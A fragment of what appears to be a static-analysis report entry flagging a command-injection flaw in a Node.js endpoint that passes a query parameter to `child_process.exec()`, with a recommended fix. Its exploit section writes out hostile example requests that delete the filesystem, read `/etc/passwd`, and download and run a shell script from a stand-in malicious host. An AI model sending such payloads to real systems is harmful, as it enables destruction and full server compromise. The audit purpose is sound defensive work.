        {
          "ruleId": "javascript_lang_dynamic_os_command",
          "level": "error",
          "message": {
            "text": "[CRITICAL] The application directly takes the `cmd` parameter from the request query string (line 65) and executes it using `child_process.exec()`. There is no sanitization or validation of the user-provided input. This creates a critical Command Injection vulnerability, allowing an attacker to inject arbitrary shell commands, which will be executed on the server with the privileges of the Node.js process.\n\nExploit: An attacker could send a request like `GET /run?cmd=ls%20-la` to list files in the current directory. More critically, `GET /run?cmd=rm%20-rf%20/` (delete everything), `GET /run?cmd=cat%20/etc/passwd` (read sensitive system files), or `GET /run?cmd=wget%20malicious.com/shell.sh%3B%20bash%20shell.sh` (download and execute a malicious script) could be executed, leading to full system compromise.\n\nFix: The fix involves several layers of defense. First, instead of `exec`, which spawns a shell and evaluates the command string, `child_process.spawn()` is used. `spawn` executes the command directly without invoking a shell, making it harder for shell metacharacters to have an effect. Second, and most importantly, input validation is implemented using a strict whitelist approach. Only predefined commands (`echo`, `ls` in this example) are allowed, and their arguments are strictly sanitized using regular expressions to ensure they contain only safe characters. This prevents attackers from injecting arbitrary commands or manipulating the original command with shell operators."
          },
